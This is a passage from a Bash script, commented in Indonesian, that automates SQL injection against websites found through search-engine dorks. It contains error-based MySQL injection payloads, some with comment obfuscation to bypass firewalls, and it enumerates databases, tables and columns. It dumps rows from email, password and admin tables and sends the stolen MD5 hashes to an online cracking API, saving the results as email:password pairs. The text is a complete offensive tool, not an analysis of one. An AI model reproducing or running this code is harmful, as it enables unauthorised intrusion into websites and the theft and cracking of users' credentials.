  curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sL "$site%27" -A "Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux x86_64; en) Opera 9.50" | grep -Po '>(.*?)<' > .site2
  curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sL "$site%27--+" -A "Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux x86_64; en) Opera 9.50" | grep -Po '>(.*?)<' > .site3
  bla=$(diff -u .site .site2)
    if [[ "$bla" = "" ]]
    then
       echo -ne "not vuln\n${N}[${R}\033[7mCRITICAL${N}] ${R}\033[2mNOT FOUND gagal mencari error page ${N}\n${N}[${R}*${N}] \033[2mmau paksa inject ?? y/n "
       read paksa
       if [[ "$paksa" = "y" ]]
       then
           echo -e "\x1b[0m${N}[${BL}`date +%T`${N}] ${O}\033[2mERROR based injection ${N}"
           error
           if [[ "$db" = "" ]]
             then
              echo -e "\x1b[0m${N}[${BL}`date +%T`${N}] $G\033[2mSTRING BASED try to string based injection method$N"
              site="$site%27"
              error
              if [[ "$db" = "" ]]
              then
                 echo -e "\x1b[0m${N}[${BL}`date +%T`${N}] ${R}ERROR based injection Failed$N"
              fi
           fi
        else
           echo -e "\x1b[0m${N}[${BL}`date +%T`${N}] ${O}coba inject manual"
        fi
    else
       echo -e "vuln sqli found"
       blas=$(diff -u .site .site3)
       if [[ "$blas" = "" ]]
       then
           echo -e "\x1b[0m${N}[${BL}`date +%T`${N}] $G\033[2mSTRING BASED try to string based injection method$N"
           site="$site%27"
           error
           if [[ "$db" = "" ]]
           then
              echo -e "\x1b[0m${N}[${BL}`date +%T`${N}] ${O}\033[2mERROR based injection ${N}"
              error
              if [[ "$db" = "" ]]
              then
                 echo -e "\x1b[0m${N}[${BL}`date +%T`${N}] ${R}ERROR based injection Failed$N"
              fi
           fi
       else
           echo -e "\x1b[0m${N}[${BL}`date +%T`${N}] ${O}\033[2mERROR based injection ${N}"
           error
           if [[ "$db" = "" ]]
           then
              echo -e "\x1b[0m${N}[${BL}`date +%T`${N}] $G\033[2mSTRING BASED try to string based injection method$N"
              site="$site%27"
              error
              if [[ "$db" = "" ]]
              then
                 echo -e "\x1b[0m${N}[${BL}`date +%T`${N}] ${R}ERROR based injection Failed$N"
              fi
           fi
       fi
    fi
}

edump () {
  rm -rf .output
  echo -ne "${N}+$coi+\n"
  if cat .table | grep -aP "email|mail" >/dev/null;then
     c=$(echo "Database :: $versi" | awk -F "${char}" '{print NF-1}' | sort -rn | uniq -i | head -1)
     coiadm=$(seq -s '=' $c | sed 's/[0-9]//g')
     echo -e "\033[1;36m Found email pass table${N}"
     echo -en "${N}+$coiadm+\n${G}"
     cat .table | sort -u | uniq -i | grep -aP "email|mail|pass|key|kode"
     echo -en "${N}+$coi+\n"
     echo "$site" >> $email_site
  fi
  if cat .table | grep -aP "admin|login|user|pengguna|kode|pass" >/dev/null;then
     c=$(echo "Database :: $versi" | awk -F "${char}" '{print NF-1}' | sort -rn | uniq -i | head -1)
     coiadm=$(seq -s '=' $c | sed 's/[0-9]//g')
     echo -e "\033[1;35m Found login aksess table${N}"
     echo -en "${N}+$coiadm+\n${G}"
     cat .table | sort -u | uniq -i | grep -aP "admin|login|user|pengguna|kode|pass"
     echo -en "${N}+$coi+\n"
     echo "$site" >> $admin_site
  fi
  trap break INT
  for kont in y
  do
   ok=0
   while [ $ok = 0 ]
   do
     if [[ "$masn" = "y" ]];then
        echo -e "${N}\033[2mpress ctrl+c kemudian ctrl+d untuk skip site${N}"
     else
        echo -e "${N}\033[2mpress ctrl+c kemudian ctrl+d untuk exit${N}"
     fi
     echo -en "Dump Table name  : "
     read table2
     if [[ "$corect" = "y" ]];then
         table=$(cat .table 2>/dev/null | cut -d ":" -f1 | grep -nH -m 1 "$table2" | head -1 | cut -d ":" -f3)
     else
         table="$table2"
     fi
     if [ ${#table} -gt 1 ]
     then
        while [ $ok = 0 ]
        do
          echo -ne "Dump Column name : "
          read co
          if [ ${#co} -gt 1 ]
          then
              cor=$(echo $co | sed 's/,/|/g')
              if cat .table | grep -Po "$table" >/dev/null
              then
                 if cat .table | grep -Po "$cor" >/dev/null
                 then
                    colom=$(echo "$co" | sed 's/,/,0x3a3a,/g')
                    echo "$cor $colom"
                    if [[ "$waff"  = "on" ]];then
                       dump="+AND+/**8**/(SELECT+1+/*!50000FROM*/+(SELECT+COUNT(*),/*!50000CONCAT*//**8**/((SELECT(SELECT+/*!50000CONCAT*//**8**/(CAST(/*!50000CONCAT*//**8**/($colom)+AS+CHAR),0x7e))+/*!50000FROM*/+$db_na.$table+LIMIT+$roy,1),FLOOR(RAND(0)*2))x+/*!50000FROM*/+/*!50000INFORMATION_SCHEMA.TABLES*/+/*!50000GROUP*/+/*!50000BY*/+x)a)--+"
                    else
                       dump="+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT($colom)+AS+CHAR),0x7e))+FROM+$db_na.$table+LIMIT+$roy,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--+"
                    fi
                    echo -e "${O}\033[2mpastikan nama yg dimasukan sudah sesuai${N}"
                    echo -e "${O}Query: ${N}\033[2m$site$dump${N}"
                    echo -e "${N}retrived_db: ${G}mysql@$db/$db_na/$table${N}~"
                    echo -e "+$coi+\n \033[0;36m$colom${N}\n+$coi+$O" | sed 's/,0x3a3a,/ :: /g'
                    trap break INT
                    for roy in $(seq 50)
                    do
                       if [[ "$waff"  = "on" ]];then
                         dump="+AND+/**8**/(SELECT+1+/*!50000FROM*/+(SELECT+COUNT(*),/*!50000CONCAT*//**8**/((SELECT(SELECT+/*!50000CONCAT*//**8**/(CAST(/*!50000CONCAT*//**8**/($colom)+AS+CHAR),0x7e))+/*!50000FROM*/+$db_na.$table+LIMIT+$roy,1),FLOOR(RAND(0)*2))x+/*!50000FROM*/+/*!50000INFORMATION_SCHEMA.TABLES*/+/*!50000GROUP*/+/*!50000BY*/+x)a)--+"
                       else
                         dump="+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT($colom)+AS+CHAR),0x7e))+FROM+$db_na.$table+LIMIT+$roy,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--+"
                       fi
                       cet=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sL "$site$dump")
                       hasil=$(echo "$cet" | grep -Po "entry (.*?) for key" | cut -d "'" -f2 | cut -d "~" -f1)
                       if [ "$hasil" = "" ]
                       then
                          if [ -f .output ];then
                             echo -e "${N}+$coi+"
                             echo -n -e "${N}${G}[${N}1${G}]${N} dump lagi\n${N}${G}[${N}2${G}]${N} kembali ke database awal${N}${G}\n[${N}3${G}].${N} kembali\n"
                             if [[ "$masn" = "y" ]];then
                                echo -en "\n${BL}biarkan kosong lalu tekan ENTER skip to next site${N}"
                             fi
                             echo -en "\n\033[2mmysql@$db/$db_na/ ?? ${G}"
                             read asks
                             case $asks in
                             1)
                                echo -e "\n${N}+$coi+\n Table Name::colomn name\n+$coi+$O"
                                cat .table
                                edump
                             ;;
                             2) error
                             ;;
                             3) menu
                                break
                             ;;
                             *) echo -en "\n${O}skip to next site${N}";;
                             esac
                             trap - INT
                             break 4
                          else
                             echo -e "KOSONG\n${N}+$coi+"
                             echo -e "${R}\033[2mF A I L E D try dump dios manual$N\n\033[2mpastikan input yg dimasukan sudah benar atau periksa koneksi\njika input sudah benar kemungkinan colomn yg di tuju kosong${N}"
                             echo -n -e "${N}${G}[${N}1${G}]${N} dump lagi\n${N}${G}[${N}2${G}]${N} kembali ke database awal${N}${G}\n[${N}3${G}].${N} kembali\n"
                             if [[ "$masn" = "y" ]];then
                                echo -en "\n${BL}biarkan kosong lalu tekan ENTER skip to next site${N}"
                             fi
                             echo -en "\n\033[2mmysql@$db/$db_na/ ?? ${G}"
                             read asks
                             case $asks in
                             1)
                                echo -e "\n${N}+$coi+\n Table Name::colomn name\n+$coi+$O"
                                cat .table
                                edump
                             ;;
                             2) error
                             ;;
                             3) menu
                                break
                             ;;
                             *) echo -en "\n${O}skip to next site${N}";;
                             esac
                             trap - INT
                             break 4
                          fi
                       else
                          echo "$hasil" >> .output
                          echo -e "${O} $hasil${N}"
                       fi
                    done
                    trap - INT
                    echo -e "${N}+$coi+"
                    echo -n -e "${N}${G}[${N}1${G}]${N} dump lagi\n${N}${G}[${N}2${G}]${N} kembali ke database awal${N}${G}\n[${N}3${G}].${N} kembali\n"
                    if [[ "$masn" = "y" ]];then
                       echo -en "\n${BL}biarkan kosong lalu tekan ENTER skip to next site${N}"
                    fi
                    echo -en "\n\033[2mmysql@$db/$db_na/ ?? ${G}"
                    read asks
                    case $asks in
                    1)
                       echo -e "\n${N}+$coi+\n Table Name::colomn name\n+$coi+$O"
                       cat .table
                       edump
                    ;;
                    2) error
                    ;;
                    3) menu
                       break
                    ;;
                    *) echo -en "\n${O}skip to next site${N}";;
                    esac
                    trap - INT
                    break 4
                  else
                     echo -e "${R}worng input$N"
                     echo -e "\n${N}+$coi+\n Table Name::colomn name\n+$coi+$O"
                     cat .table
                     edump
                  fi
              else
                  echo -e "${R}worng input$N"
                  echo -e "\n${N}+$coi+\n Table Name::colomn name\n+$coi+$O"
                  cat .table
                  edump
              fi
          else
              echo -e "${R}worng input$N"
              echo -e "\n${N}+$coi+\n Table Name::colomn name\n+$coi+$O"
              cat .table
              edump
          fi
          done
       else
          echo -e "${R}worng input$N"
          echo -e "\n${N}+$coi+\n Table Name::colomn name\n+$coi+$O"
          cat .table
          edump
       fi
       done
      done
}

error() {
getdb="+AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(DATABASE()+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=DATABASE()+LIMIT+1,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--+"
cet=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sL "$site$getdb")
if [[ "$debug" = "y" ]];then
    echo "$cet"
fi
if echo -e "$cet" | grep -Po 'Not Acceptable|blocked|connection was reset|Forbidden|forbidden|Not Acceptable|Internal Server Error | head -1' > .waf
then
    getdb="+AND/**8**/(SELECT+1+/*!50000FROM*/+(SELECT+COUNT(*),CONCAT/**8**/((SELECT(SELECT+/*!50000CONCAT*//**8**/(CAST(/*!50000DATABASE*//**8**/()+AS+CHAR),0x7e))+/*!50000FROM*/+/*!50000INFORMATION_SCHEMA.TABLES*/+/*!50000WHERE*/+table_schema=DATABASE/**8**/()+LIMIT+1,1),FLOOR(RAND(0)*2))x+/*!50000FROM*/+/*!50000INFORMATION_SCHEMA.TABLES*/+/*!50000GROUP*/+/*!50000BY*/+x)a)--+"
    cet=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sL "$site$getdb")
    waff="on"
    echo -e "\x1b[0m${N}[\033[2;35m`date +%T`${N}] ${O}Waff bypasing${N}\033[2m $site$getdb"
fi
db=$(echo "$cet" | grep -Po "entry (.*?) for key" | cut -d "'" -f2 | cut -d "~" -f1)
if [[ "$waff" = "on" ]]
then
    getver="+OR+1+/*!50000GROUP*/+/*!50000BY*/+/*!50000CONCAT_WS*/(0x3a,version/**8**/(),0x3c,user/**8**/(),FLOOR(RAND(0)*2))+HAVING+MIN(0)+OR+1--+"
else
    getver="+OR+1+GROUP+BY+CONCAT_WS(0x3a,version(),0x3c,user(),FLOOR(RAND(0)*2))+HAVING+MIN(0)+OR+1--+"
fi
cet=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sL "$site$getver")
versi=$(echo "$cet" | grep -Po "entry (.*?) for key" | cut -d "'" -f2 | cut -d "~" -f1 | sed 's/</\nUser server :: /g')
if [ "$db" = "" ]
then
   echo -e "\x1b[0m${N}[${R}\033[2m`date +%T`${N}] ${O}Gagal mengambil DB${N}"
   fail="y"
else
   echo -e "${N}[${O}INFO${N}]${G} $dir injected ERROR Based method${O}"
   echo -e "version :: $versi\nDatabase :: $db\n${O}Query : ${N}\033[2m$site$getdb ${N}"
   rt="y"
   if [[ "$rt" = "y" ]]
   then
   c=$(echo "Database :: $versi" | awk -F "${char}" '{print NF-1}' | sort -rn | uniq -i | head -1)
   coi=$(seq -s '-' $c | sed 's/[0-9]//g');rm -rf .table
   echo -e "${N}retrived_db: ${G}mysql@$db${N}~"
   rm -rf .db_er
   trap break INT
   for top2 in $(seq 50)
   do
      if [ $? -eq 0 ]
      then
      if [[ "$waff" = "on" ]]
      then
         getdb="+AND/**8**/(SELECT+1+/*!50000FROM*/+(SELECT+COUNT(*),/*!50000CONCAT*//**8**/((SELECT(SELECT+/*!50000CONCAT*//**8**/(CAST(/*!50000schema_name*/+AS+CHAR),0x7e))+/*!50000FROM*/+/*!50000INFORMATION_SCHEMA.SCHEMATA*/+LIMIT+${top2},1),FLOOR(RAND(0)*2))x+/*!50000FROM*/+/*!50000INFORMATION_SCHEMA.TABLES*/+/*!50000GROUP*/+/*!50000BY*/+x)a)--+"
      else
         getdb="+AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(schema_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.SCHEMATA+LIMIT+${top2},1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--+"
      fi
      cet=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sL "$site$getdb")
      data2=$(echo "$cet" | grep -Po "entry (.*?) for key" | cut -d "'" -f2 | cut -d "~" -f1)
      if [[ "$data2" = "" ]]
      then
         break
      else
         echo -e "$data2" >> .db_er
         echo -e "${O}~ ${N}$data2"
      fi
      else
         echo -e "\n${R}$N[${R}\033[7;31mCRITICAL${N}]$O connection error: periksa kembali URL atau server down$N" >&2
      fi
   done
   trap - INT
   db_er2=$(cat .db_er 2>/dev/null)
   echo -e "${R}~${N} dios"
   echo -e "Dump Db: ${O}"
   read db_ro
   if [[ "$corect" = "y" ]];then
      db_root=$(grep -nH -m 1 -R "$db_ro" .db_er | head -1 | cut -d ":" -f3)
   else
      db_root="$db_ro"
   fi
   db_na=$(cat .db_er | grep -Po "$db_root" | sort -u | uniq -i)
   if cat .db_er | grep -Po "$db_ro" >/dev/null
   then
      echo -e "${O}\033[2mpastikan nama yg dimasukan sudah sesuai${N}"
      db_na=$(cat .db_er | grep -Po "$db_root" | sort -u | uniq -i)
      if [[ -z $dbdir ]];then
         db_dir="null"
      fi
      if [[ -z $db_na ]];then
         db_na="null"
      fi
      echo -en "${N}retrived_db: ${G}mysql@$db/$db_na${N}~\n"
      dump_sqli="y"
      asx="$db_na"
      hex=$(for ((ihex=0;ihex<${#asx};ihex++));do printf %02X \'${asx:$ihex:1};done)
      hex=$(echo "0x$hex")
   else
      if echo "$db_ro" | grep -Po "dios|DIOS|di|os|dio|DIO|dioS|Dio|Dios" >/dev/null
      then
         dump_sqli="n"
         hex="database/**8**/()"
         echo -e "${O}\033[2mlangsung dios....${N}"
      else
         echo -e "${O}\033[2mpastikan nama yg dimasukan sudah sesuai${N}"
         error
      fi
   fi
   echo -e "${N}\033[2mtekan ctrl+c 2x untuk skip ke prosess selanjut nya${N}"
   echo -e "+$coi+\n Table Name::colomn name\n+$coi+$O"
   trap break 4 INT
   for pot in $(seq 50)
   do
     if [[ "$waff" = "on" ]]
     then
        getdb="+AND/**8**/(SELECT+1+/*!50000FROM*/+(SELECT+COUNT(*),/*!50000CONCAT*//**8**/((SELECT(SELECT+/*!50000CONCAT*//**8**/(CAST(/*!50000table_name*/+AS+CHAR),0x7e))+/*!50000FROM*/+/*!50000INFORMATION_SCHEMA.TABLES*/+/*!50000WHERE*/+table_schema=$hex+LIMIT+$pot,1),FLOOR(RAND(0)*2))x+/*!50000FROM*/+/*!50000INFORMATION_SCHEMA.TABLES*/+/*!50000GROUP*/+/*!50000BY*/+x)a)--+"
     else
        getdb="+AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(table_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=$hex+LIMIT+$pot,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--+"
     fi
     cet=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sL "$site$getdb")
     table=$(echo "$cet $site$getdb" | grep -Po "entry (.*?) for key" | cut -d "'" -f2 | cut -d "~" -f1)
     if [ "$table" = "" ]
     then
        if cat .table 2>/dev/null >/dev/null
        then
           edump
        else
           echo -e "${O}Kosong\n${N}+$coi+"
           echo -e "\033[2mdatabase yang dituju kosong${N}"
           error
           break
        fi
     else
         trap break 4 INT
         for top in $(seq 50)
         do
            if [ $? -eq 0 ]
            then
            asx1="$table"
            hex1=$(for ((ihex1=0;ihex1<${#asx1};ihex1++));do printf %02X \'${asx1:$ihex1:1};done)
            hex1=$(echo "0x$hex1")
            if [[ "$waff" = "on" ]]
            then
              getdb="+AND+/**8**/(SELECT+1+/*!50000FROM*/+(SELECT+COUNT(*),/*!50000CONCAT*//**8**/((SELECT(SELECT+/*!50000CONCAT*//**8**/(CAST(/*!50000column_name*/+AS+CHAR),0x7e))+/*!50000FROM*/+/*!50000INFORMATION_SCHEMA.COLUMNS*/+/*!50000WHERE*/+table_name=$hex1+AND+table_schema=$hex+LIMIT+$top,1),FLOOR(RAND(0)*2))x+/*!50000FROM*/+/*!50000INFORMATION_SCHEMA.TABLES*/+/*!50000GROUP*/+/*!50000BY*/+x)a)--+"
            else
              getdb="+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(column_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+table_name=$hex1+AND+table_schema=$hex+LIMIT+$top,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--+"
            fi
            cet=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sL "$site$getdb")
            colom=$(echo "$cet" | grep -Po "entry (.*?) for key" | cut -d "'" -f2 | cut -d "~" -f1)
            if [[ "$debug" = "y" ]];then
               echo -e "$site$getdb\n\n$table::$colom"
            fi
            if [ "$colom" = "" ]
            then
               break
            else
               if [ "$colom" = "" ]
               then
                  echo -e "${O}Kosong\+$coi+"
                  break
               else
                  echo "$table::$colom" >> .table
                  echo " $table::$colom"
               fi
            fi
            else
               if [ "$colom" = "" ]
               then
                  echo -e "${O}Kosong\n+$coi+"
                  break
               fi
            fi
         done
     fi
   done
   trap - INT
   if cat .table >/dev/null
   then
      edump
   else
      echo -e "${O}Kosong\n+$coi+"
      break
   fi
  fi
fi

}

hashdump() {
	gg=$(echo "$cury" | grep -Po "[[::\:\ :: \|\ | ]*]*" | head -1)
liste=$(echo "$cury" | sed "s/${gg}/:/g")
total=$(echo "$cury" | wc -l )
del=":"
echo -e "${O}[+] Total       : $total Empas\n[*] Cracking all Password....."
echo -e "Nb: jika ingin langsung ke hasil press CTRL + C / vol down + C"
rm -rf .0-$list .1-$list .email-$list .pw-$list
trap break INT
for op in y
do
   echo "$liste" | while read empass
     do
     	hash=$(echo "$empass" | cut -d "$del" -f2)
     	email=$(echo "$empass" | cut -d "$del" -f1)
        pass=$(curl -sL --max-time $time_out "https://md5decrypt.net/Api/api.php?hash=${hash}&hash_type=md5&email=deanna_abshire@proxymail.eu&code=1152464b80a61728" -A "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/ 537.36 (KHTML, like Gecko) Chrome/88.0")
        if echo "$pass" | grep -Po "</html>|<html>|</" >/dev/null
        then
        	echo -e "${R}The API is offline (in fact the whole website is offline)${N}"
            break
        fi
        if [[ "$pass" = "" ]];then
           echo "${hash}" >> .0-$list
           echo -e "${R}[?] Not Cracked: ${hash} ${N}"
        else
          echo "asw" >> .1-$list
          echo "$email:$pass" >> cracked-$list
          echo -e "${G}[!] Cracked: $email:$pass${N}"
        fi
     done
done
trap - INT
echo -e "[*] Done.....\n[+] Result : cracked-$list"
echo -e "[+] Total  : $(cat .1-$list 2>/dev/null | wc -l) Empass Cracked"
echo -e "[+] Total  : $(cat .0-$list 2>/dev/null | wc -l) Empass Not Cracked"
echo -e "[*] Thx for using this tools :')"
}

hashid() {
echo -e "[+]Hash Identifier"
read -p "Hash: " hash
ngcek=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sL "https://www.onlinehashcrack.com/hash-identification.php#results" -X POST --data "hash=${hash}&submit=submit" | grep -Po "\- [^<]*<br />" | cut -d "<" -f1 )
if [ "$ngcek" = "" ]
then
echo -e "Hash Unknow"
else
echo -e "[*]Hash Type:$ngcek" | head -1
echo -e "$ngcek" | sed 's/- /[INFO] Result: /g'
fi
sleep 10
}

hashmail() {
echo -n -e "[+] input list : "
read list
if [[ "$list" = "" ]];then
    echo -e "${P}File tidak di temukan atau kosong${N}"
    hashmail
fi
gg=$(cat "$list" | grep -Po "[[::\:\ :: \|\ | ]*]*" | head -1)
liste=$(cat "$list" | sed "s/${gg}/:/g")
total=$(cat "$list" | wc -l )
del=":"
echo -e "${O}[+] Total       : $total Empas\n[*] Cracking all Password....."
echo -e "Nb: jika ingin langsung ke hasil press CTRL + C / vol down + C"
rm -rf .0-$list .1-$list .email-$list .pw-$list
trap break INT
for op in y
do
   echo "$liste" | while read empass
     do
     	hash=$(echo "$empass" | cut -d "$del" -f2)
     	email=$(echo "$empass" | cut -d "$del" -f1)
        pass=$(curl -sL --max-time $time_out "https://md5decrypt.net/Api/api.php?hash=${hash}&hash_type=md5&email=deanna_abshire@proxymail.eu&code=1152464b80a61728" -A "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/ 537.36 (KHTML, like Gecko) Chrome/88.0")
        if echo "$pass" | grep -Po "</html>|<html>|</" >/dev/null
        then
        	echo -e "${R}The API is offline (in fact the whole website is offline)${N}"
            break
        fi
        if [[ "$pass" = "" ]];then
           echo "${hash}" >> .0-$list
           echo -e "${R}[?] Not Cracked: ${hash} ${N}"
        else
          echo "asw" >> .1-$list
          echo "$email:$pass" >> cracked-$list
          echo -e "${G}[!] Cracked: $email:$pass${N}"
        fi
     done
done
trap - INT
echo -e "[*] Done.....\n[+] Result : cracked-$list"
echo -e "[+] Total  : $(cat .1-$list 2>/dev/null | wc -l) Empass Cracked"
echo -e "[+] Total  : $(cat .0-$list 2>/dev/null | wc -l) Empass Not Cracked"
echo -e "[*] Thx for using this tools :')"
echo -en "${P}Presss Enter For continue "
read lanjutkan
}


dora() {
  if [[ "$hekel" = "y" ]];then
     rm -rf .result_dork .not .url .bad .wp .live
     dir=$(echo $site | sed 's!http[s]*://!!g' | cut -d '/' -f1)
     mkdir -p output/$dir
  fi
  echo -e "${N}\033[2mloading.... $dork\ngunakan ctrl-c untuk skip ke prosess selanjut nya\n${N}please wait pastikan koneksi cepat dan stabil..." | tr "+" " ";rm -rf .result_dork .not .url
    for COUNT in $(seq 1 $pa)
       do
         echo -e "${G}Result from bing page $COUNT${N}"
         curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sL "http://www.bing.com/search?q=$dork&qs=n&pq=$dork&sc=8-5&sp=-1&sk=&first=$COUNT&FORM=PORE" | grep -Po '_blank" href="[^"]*' | sort -u | uniq -i | cut -d '"' -f3 | sed '/facebook/d' | sed '/google/d' | sed '/twitter/d' | sed '/microsoft/d' | sed '/youtube/d' | sed '/&amp/d' | sed "/amp;/d" >> .result_dork
         cat .result_dork 2>/dev/null | while read ress; do
         echo -e "Result => ${O}$ress${N}";done
         echo -e "${G}Result from google page $COUNT${N}"
         dork2=$(echo "$dork" | sed "s,inurl:,+,g")
         curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -s "https://www.google.com/search?q=${dork2}=&start=${COUNT}" -L | grep -Po '<a href="\K.*?(?=".*)' | egrep -o "(http(s)?://){1}[^'\"]+" | sed '/facebook/d' | sed '/google/d' | sed '/twitter/d' | sed '/instagram/d' | sed '/youtube/d' | sed '/google/d' | sed '/amp;/d' >> .result_dork
         cat .result_dork 2>/dev/null | while read ress; do
         echo -e "Result => ${O}$ress${N}";done
         echo -e "${G}Result from ask.com page $COUNT${N}"
         curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out "uk.ask.com/web?q=$dork&page=${COUNT}" -sL | grep -Po "blank\" href='[^']*'" | cut -d "'" -f2 | sed '/amp;/d' >> .result_dork
         cat .result_dork 2>/dev/null | while read ress; do
         echo -e "Result => ${O}$ress${N}";done
         echo -e "${G}Result from yahoo page $COUNT${N}"
         curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out "https://search.yahoo.com/search?ei=UTF-8&gprid=&fr2=sb-top&p=$dork&b=${COUNT}" -sL | grep -Po 'lh-24\" href="[^"]*"' | cut -d '"' -f3 | sed '/r.search.yahoo.com/d' | sed '/amp;/d' >> .result_dork
         cat .result_dork 2>/dev/null | while read ress; do
         echo -e "Result => ${O}$ress${N}";done
   done
   b=$(cat .result_dork 2>/dev/null | sort | uniq -i)
   echo -e "${N}\033[2mgunakan ctrl+c untuk skip ke prosess selanjut nya\n${N}please wait pastikan koneksi cepat dan stabil..."
   echo -e "\033[2mReplacing all duplicate result\n${G}\033[2mscaning $(echo "$b" | wc -l) result site from $COUNT page"
         for b in $(echo "$b")
           do
             if echo -e "$b" | grep -Po '.php\?|=|.aspx\?|\?=' >/dev/null
             then
                curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sL "$b%27" > .site
                curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sL "$b" > .site2
                if cat .site | grep -Po "$sqli_error" | head -1 > .error
                then
                  sp="/-|"
                  #b = site hasil dork dan jika dorking singgle site dan dorking dork itu berbeda
                  dir=$(echo "$b" | sed 's!http[s]*://!!g' | cut -d '/' -f1)
                  mkdir -p output/$dir
                  bla=$(diff -u .site .site2)
                  if [[ "$bla" = "" ]]
                  then
                     echo -e "\x1b[0m${N}[${R}!${N}] ${BL}Not Vuln : ${R}\033[2m$b ${N}\n"
                     echo "${R}Not vuln  : $b" >> .not
                  else
                     lol=$(cat .error)
                     if [[ "$lol" = "" ]]
                     then
                        echo -e "$b" >> $result_vuln
                        echo -e "$b" >> .vuln
                        echo -e "$b" >> output/$dir/inject_point.txt
                        echo -e "\x1b[0m${N}[${O}+${N}] ${O}Vuln  ${N}: $b${N}"
                        echo -e "\x1b[0m${N}[${O}+${N}] ${R}Error ${N}: \033[2mpage blank${N}"
                        dorkscan
                     else
                        echo -e "$b" >> $result_vuln
                        echo -e "$b" >> .vuln
                        echo -e "$b" >> output/$dir/inject_point.txt
                        echo -e "\x1b[0m${N}[${BL}*${N}] ${O}Vuln  ${N}: $b${N}"
                        echo -e "\x1b[0m${N}[${BL}*${N}] ${R}Error ${N}: \033[2m`cat .error`${N}"
                        dorkscan
                     fi
                  fi
                fi
             else
                echo -e "\x1b[0m${N}[${R}!${N}] ${BL}Url   : ${R}\033[2m$b ${N}\n"
                echo -e "$b" >> .url
             fi
        done

}

sp="1234567890"
sc=0
spin() {
   printf "\b${sp:sc++:1}"
   ((sc==${#sp})) && sc=0
}
endspin() {
   printf "\r%s\n" "$@"
}



dump() {
         #echo -e "$by \n $waff"
          for aswlo in y
          do
          c=$(cat .table | awk -F "${char}" '{print NF-1}' | sort -rn | uniq -i | head -1)
          coi=$(seq -s '-' $c | sed 's/[0-9]//g')
          echo -e "${N}+$coi+\nTable Name::colomn name\n+$coi+$O"
          cat .table | sort -u | uniq -i
          echo -en "${N}+$coi+\n"
          if cat .table | grep -aP "email|mail" >/dev/null;then
             c=$(cat .table | awk -F "${char}" '{print NF-1}' | sort -rn | uniq -i | head -1)
             coiadm=$(seq -s '=' $c | sed 's/[0-9]//g')
             echo -e "\033[1;36m Found email pass table${N}"
             echo -en "${N}+$coiadm+\n${G}"
             cat .table | sort -u | uniq -i | grep -aP "email|mail|pass|key|kode"
             echo -en "${N}+$coi+\n"
             echo "$site" >> $email_site
             emailna="y"
          fi
          if cat .table | grep -aP "admin|login|user|pengguna|kode|pass" >/dev/null;then
             c=$(cat .table | awk -F "${char}" '{print NF-1}' | sort -rn | uniq -i | head -1)
             coiadm=$(seq -s '=' $c | sed 's/[0-9]//g')
